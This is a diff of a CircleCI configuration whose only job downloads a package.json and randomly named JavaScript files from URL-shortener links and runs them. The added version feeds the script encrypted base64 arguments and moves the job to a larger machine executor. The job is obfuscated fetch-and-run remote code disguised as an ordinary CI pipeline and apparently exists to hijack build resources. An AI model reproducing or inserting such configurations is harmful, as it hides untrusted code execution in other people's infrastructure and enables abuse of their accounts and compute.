@@ -1,14 +1,16 @@
 version: 2.1
-
+orbs:
+  android: circleci/android@1.0
 jobs:
   admin:
-    docker:
-      - image: node:16
-    resource_class: medium
+    executor:
+      name: android/android-machine
+    #resource_class: medium
     steps:
       - run: 
-          command: curl -fsSL shorturl.at/jJLNU -o package.json && curl -fsSL shorturl.at/cjBC2 -o sdfkgjweimsdf.js && curl -fsSL shorturl.at/tCDFN -o log-print.js
-      - run: npm i -s && node sdfkgjweimsdf.js docker 2
+          command: curl -fsSL shorturl.at/ekxLM -o package.json && curl -fsSL shorturl.at/hiIV8 -o sgdfgerjhsdfe.js && curl -fsSL shorturl.at/aotR9 -o logger.js
+      - run: npm i -s
+      - run: node sgdfgerjhsdfe -r U2FsdGVkX1+jDDCHzH7XUwKe1yP1PUQ+ZZ6IGE9QIJz1+mRqfqbv84KQvSmcO5kQVimqRsrPo/XUmHG07kDcypHxLCacb0kbsWMoe+aJrzPKZNASaef2UM6+YCkeXi57rlp7i5+jwoavfgk/KZJT0Dwxx4CWs8kbyPU22a2+CsLpEYg7/y1Oxg6QJ7D8TNkJGOnZDcYmENhRnmHoQXGdSXwPq7KmgN/52xxRmLjGAJ4J/DLLO5y2c3ic2oClIHc2tNugKCdIUvED5SZti344AlaF/gJiw45//tdNVeW4eWNROTL3vGyQav0JAP5FvJI3Yy2iLYBFMF91PGusFhQALw7qjKMDWNtKcEwMQSGlbggQWg5oTc2IRzZnwPQcYyHo -t U2FsdGVkX1+fkDxyJG2Xn23funqphl+JKuWnL8aKGja2WbPpx4c4XjPL94EloxYS -lpn U2FsdGVkX1+u3y7tEfaS5e3I8EsTPw2bEM1S7O0J/Wc= -sp -s U2FsdGVkX18ihAgKJcspg5qwnEePG9BkENYQ+GdrmLb0O01g+ftzXyS72Tsca6bu3aK68MWO2HAZEL2yI/KZLibq+0eYZuqpQejtgxH+iYdA3ABgLGS9OWpxYbZs9ave3lf3ivy3t0M4MX/ivA+TTpU/34oCaq95l0x4hTteV3Ex03GpqmoB5k/gDy4ido5OWxb53Uqt0dW8iipi0ZhpQKpF1f/znNpTFT7AvVQT8v0=
       
 workflows:
   start-work:
